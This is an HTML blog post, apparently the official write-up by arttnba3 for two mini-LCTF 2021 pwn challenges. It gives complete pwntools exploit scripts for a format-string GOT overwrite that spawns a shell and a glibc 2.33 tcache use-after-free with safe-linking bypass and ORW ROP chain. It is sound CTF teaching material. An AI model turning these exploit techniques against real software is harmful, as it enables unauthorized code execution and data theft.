@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"archive.next.arttnba3.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x00.绪论很高兴能和RX大哥和协会的其他师傅一起出了这一次 minilCTF 2021 的题，虽然说只出了两道比较简单的题233333，不过还是希望大家能够喜欢（） 点开下方查看题解👇">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTF题解-0x09】mini-LCTF 2021 official write up by arttnba3">
+<meta property="og:url" content="http://archive.next.arttnba3.cn/2021/05/14/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x09%E3%80%91mini-LCTF-2021/index.html">
+<meta property="og:site_name" content="arttnba3&#39;s blog">
+<meta property="og:description" content="0x00.绪论很高兴能和RX大哥和协会的其他师傅一起出了这一次 minilCTF 2021 的题，虽然说只出了两道比较简单的题233333，不过还是希望大家能够喜欢（） 点开下方查看题解👇">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/04/23/8kAW31PorMOVBsa.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/15/Oqpem3yrg2UJlYC.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/22/EA873jmk2bIy4ca.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/06/Ws1dxZrRBTpJz72.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/15/9GLfiSZnR6e4Xvp.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/15/LQfOiMuyn24WktF.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t016933e48a0f026951.jpg">
+<meta property="article:published_time" content="2021-05-14T11:31:34.000Z">
+<meta property="article:modified_time" content="2021-05-14T16:21:32.363Z">
+<meta property="article:author" content="arttnba3">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="堆">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="格式字符串">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/23/8kAW31PorMOVBsa.png">
+
+<link rel="canonical" href="http://archive.next.arttnba3.cn/2021/05/14/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x09%E3%80%91mini-LCTF-2021/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>【CTF题解-0x09】mini-LCTF 2021 official write up by arttnba3 | arttnba3's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">arttnba3's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">- arttnba3的隐秘小窝 -</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/arttnba3" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://archive.next.arttnba3.cn/2021/05/14/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x09%E3%80%91mini-LCTF-2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="arttnba3">
+      <meta itemprop="description" content="- 做了关于你的梦，所以不愿醒来呢 -">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="arttnba3's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【CTF题解-0x09】mini-LCTF 2021 official write up by arttnba3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-05-14 19:31:34" itemprop="dateCreated datePublished" datetime="2021-05-14T19:31:34+08:00">2021-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-05-15 00:21:32" itemprop="dateModified" datetime="2021-05-15T00:21:32+08:00">2021-05-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>很高兴能和RX大哥和协会的其他师傅一起出了这一次 minilCTF 2021 的题，虽然说只出了两道比较简单的题233333，不过还是希望大家能够喜欢（）</p>
+<p>点开下方查看题解👇</p>
+<a id="more"></a>
+
+<h1 id="0x01-Baby-Repeater-fmtstr-got-hijack"><a href="#0x01-Baby-Repeater-fmtstr-got-hijack" class="headerlink" title="0x01.Baby Repeater - fmtstr + got hijack"></a>0x01.Baby Repeater - fmtstr + got hijack</h1><p>预期是利用格式化字符串泄露 libc 和 程序加载基地址，之后利用格式化字符串劫持 got 表，比较方便的就是改 printf 为 system，只用修改3个字节，也看到有人选择改为 one_gadget 的，基本上都在预期内</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>漏洞点比较明显，一个可以无限使用的格式化字符串漏洞</p>
+<p>简单测一下，格式化字符串是栈上的第八个参数</p>
+<p><img src="https://i.loli.net/2021/04/23/8kAW31PorMOVBsa.png" alt="image.png"></p>
+<p>checksec一下，发现no relro，那就直接利用格式字符串漏洞泄露程序加载基地址与 libc 基址后改 printf@got 为 system 后输入 <code>;sh</code> 就可以拿到 shell 了</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./baby_repeater'</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby_repeater'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.31.so'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"%107$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"&gt; Your sentence: "</span>)</span><br><span class="line">main_addr = int(p.recvuntil(<span class="string">b'\n'</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - <span class="number">42</span></span><br><span class="line">elf_base = main_addr - e.sym[<span class="string">'main'</span>]</span><br><span class="line">log.success(<span class="string">'elf base: '</span> + hex(elf_base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"%111$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"&gt; Your sentence: "</span>)</span><br><span class="line">libc_base = int(p.recvuntil(<span class="string">b'\n'</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">243</span></span><br><span class="line">log.success(<span class="string">'libc base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">printf_got = elf_base + e.got[<span class="string">'printf'</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">sys_low = sys_addr &amp; <span class="number">0xffff</span></span><br><span class="line">sys_high = (sys_addr &gt;&gt; <span class="number">16</span>)  &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'%'</span> + str(sys_high - <span class="number">15</span>).encode() + <span class="string">b'c%12$hhn'</span></span><br><span class="line">payload += <span class="string">b'%'</span> + str(sys_low - sys_high).encode() + <span class="string">b'c%13$hn'</span></span><br><span class="line">payload = payload.ljust(<span class="number">4</span> * <span class="number">8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">2</span>)</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">';sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-easytcache-Use-After-Free-safe-linking-bypass-ORW-（-FSOP）"><a href="#0x02-easytcache-Use-After-Free-safe-linking-bypass-ORW-（-FSOP）" class="headerlink" title="0x02. easytcache - Use After Free + safe-linking bypass + ORW （+ FSOP）"></a>0x02. easytcache - Use After Free + safe-linking bypass + ORW （+ FSOP）</h1><p>这道题校内没人出….只有一个校外的师傅做出来了，还非预期了……</p>
+<p>BB：</p>
+<p><img src="https://i.loli.net/2021/05/15/Oqpem3yrg2UJlYC.png" alt="image.png"></p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>使用如下指令编译，保护全开，扣光符号表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ g++ easytcache.cpp -o easytcache -fstack-protector-all -z now -z noexecstack -pie -s</span><br></pre></td></tr></table></figure>
+
+<p>在开头的<code>init_state()</code>函数中设置了沙箱，目的是让选手只能通过orw来获得flag</p>
+<p>题目提供了分配、编辑、打印、释放堆块的功能，以及一个手动调用exit函数退出的功能</p>
+<p>同时题目限制<strong>只能分配5个chunk，只能释放3次</strong>，超出这个限制便会抛出<code>A3LibException</code>中止程序</p>
+<p>漏洞点在于释放堆块时没有将堆块指针置0，但是libc版本为2.31，有着tcache key，无法直接double free</p>
+<p>题目本身有个逻辑漏洞，在 <code>deleteNote()</code> 函数中虽然会检测堆块是否已释放，但是会在检测之前使用取反的方式改变标志位，因此可以在改变标志位后使用 edit 功能清除 tcache key，之后完成doule free</p>
+<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>题目限制了只能分配5个 chunk，每一次分配都需要精打细算，为了能够达到更多次的任意地址写，所以考虑直接劫持 tcache 结构体</p>
+<p>首先通过double free后打印泄漏出堆基址，之后就是 edit 后分配到 tcache 结构体，修改 counts 全满后<strong>将 tcache free 进 unsorted bin 后</strong>打印就可以泄漏出栈基址，<strong>此时我们还剩下两次 malloc 的机会，0 次 free 的机会</strong>，不过好在我们已经控制了 tcache 结构体，可以直接分配堆块到我们想要的地方<br>需要注意的是自 libc2.32 起新增了 safe-linking 机制（本题为 2.33），对于 tcache 与 fastbin 中的 chunk 的 next 指针都会与自身地址右移 12 位后的值进行异或，但是 tcache_entry 中存放的仍然为未加密指针</p>
+<p>最常规的办法就是改 __malloc_hook 为 one_gadget 以get shell，但是这一题限制了系统调用，只能进行orw</p>
+<p><img src="https://i.loli.net/2021/04/22/EA873jmk2bIy4ca.png" alt="image.png"></p>
+<h3 id="解法一：-environ泄露栈地址在栈上构造ROP进行ORW"><a href="#解法一：-environ泄露栈地址在栈上构造ROP进行ORW" class="headerlink" title="解法一：__environ泄露栈地址在栈上构造ROP进行ORW"></a>解法一：__environ泄露栈地址在栈上构造ROP进行ORW</h3><p>在 <code>__environ</code> 这个变量中保存着栈上地址，我们可以通过这个变量获取栈上地址，随后就可以分配一个位于栈上的 chunk ，最后就是常规的通过 ROP 进行 ORW</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">'./ld-2.33.so'</span>, <span class="string">'./easytcache'</span>], env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)<span class="comment">#p = remote('pwn.woooo.tech', 10071)#</span></span><br><span class="line">e = ELF(<span class="string">'./easytcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">one_gadget = <span class="number">0xe6e73</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Your choice: "</span>)</span><br><span class="line">    p.sendline(str(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size?"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content?"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    log.info(<span class="string">"start leaking the heap base addr..."</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b'arttnba3'</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'arttnba3'</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">'heap base leak: '</span> + str(hex(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b'arttnba3'</span> * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64((heap_base + <span class="number">0x10</span>) ^ ((heap_base + <span class="number">0x290</span> + <span class="number">0x11c10</span> + <span class="number">0x10</span>) &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2, our fake chunk based on tcache manager</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b'\x00\x00'</span> * <span class="number">39</span> + <span class="string">b'\x07\x00'</span>) <span class="comment"># set it full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    log.info(<span class="string">"start leaking the libc base addr..."</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b'\x0a'</span>)</span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - <span class="number">96</span> - <span class="number">0xa</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base leak: '</span> + str(hex(libc_base)))</span><br><span class="line">    edit(<span class="number">2</span>, (<span class="string">b"\x01\x00"</span>).ljust(<span class="number">128</span>, <span class="string">b'\x00'</span>) + p64(libc_base + libc.sym[<span class="string">'__environ'</span>] - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the orw rop chain</span></span><br><span class="line">    log.info(<span class="string">"start constructing the orw rop chain..."</span>)</span><br><span class="line">    flag_addr = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">"pop rdi ; ret"</span>)).__next__()</span><br><span class="line">    log.success(hex(pop_rdi_ret))</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">"pop rsi ; ret"</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">"pop rdx ; ret"</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">'pop rdx ; pop rbx ; ret'</span>)).__next__()</span><br><span class="line">    ret = libc_base + libc.search(asm(<span class="string">'ret'</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    orw = <span class="string">b''</span></span><br><span class="line">    orw += <span class="string">b'arttnba3'</span> * <span class="number">3</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">'read'</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">'open'</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">'read'</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">'write'</span>])</span><br><span class="line">    log.success(<span class="string">"construction complete"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the stack addr</span></span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx 3, fake chunk on __environ</span></span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">b'arttnba3'</span> * <span class="number">2</span>)</span><br><span class="line">    dump(<span class="number">3</span>)</span><br><span class="line">    __environ = u64(p.recvuntil(<span class="string">b"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    log.success(<span class="string">'stack addr leak: '</span> + hex(__environ))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    log.info(<span class="string">"start sending the orw rop chain..."</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">2</span>, (<span class="string">b"\x00\x00"</span> * <span class="number">15</span> + <span class="string">b'\x01\x00'</span>).ljust(<span class="number">128</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">0</span>) * <span class="number">15</span> + p64(__environ - <span class="number">0x168</span>)) <span class="comment"># local is 0x140, something may be wrong?</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx 4, fake chunk on the stack</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">4</span>, orw)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b'/flag\x00'</span>)</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b"Done!\n"</span>)</span><br><span class="line">    log.success(<span class="string">"flag received: "</span>)</span><br><span class="line">    print(p.recvuntil(<span class="string">b'&#125;'</span>).decode())</span><br><span class="line">    p.recv()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
